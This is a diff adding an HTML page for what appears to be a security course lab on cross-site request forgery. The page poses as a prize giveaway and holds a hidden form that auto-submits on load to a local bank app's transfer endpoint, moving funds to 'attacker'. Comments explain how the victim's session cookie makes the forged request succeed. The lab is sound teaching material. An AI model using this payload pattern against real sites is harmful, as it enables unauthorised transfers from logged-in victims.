@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free iPhone Giveaway!</title>
+</head>
+<body>
+  <!--
+    CSRF ATTACK DEMONSTRATION — Day 16 Lab
+
+    This page simulates a malicious site a victim might land on via a
+    phishing link, a compromised ad, or a shortened URL shared in a chat.
+    It has NO relationship to the bank app other than knowing its endpoint
+    URL and the names of its form fields — both of which are trivially
+    discoverable by viewing the bank's own page source.
+
+    The attack works in three steps:
+      1. The victim is already logged into the bank in another tab, so
+         their browser holds a valid session cookie for 127.0.0.1:5000.
+      2. This page auto-submits a hidden form to that exact endpoint the
+         instant it loads — no click required.
+      3. The browser, following normal cookie behavior, attaches the
+         victim's real session cookie to this request automatically,
+         because the request's DESTINATION is 127.0.0.1:5000 — the
+         browser doesn't care that the request originated from this
+         unrelated page.
+
+    The bank server (in its vulnerable state) sees what looks like a
+    perfectly normal, authenticated transfer request and processes it.
+  -->
+  <h1>You've won a prize! Click anywhere to claim.</h1>
+
+  <form id="csrf-form" action="http://127.0.0.1:5000/transfer" method="POST" style="display:none;">
+    <input type="hidden" name="recipient" value="attacker">
+    <input type="hidden" name="amount" value="9999">
+  </form>
+
+  <script>
+    // Auto-submits immediately on page load — a real attacker would
+    // disguise this further (e.g. delay it, hide it behind an image
+    // click), but an instant auto-submit makes the lab's cause and
+    // effect unambiguous to observe.
+    document.getElementById("csrf-form").submit();
+  </script>
+</body>
+</html>
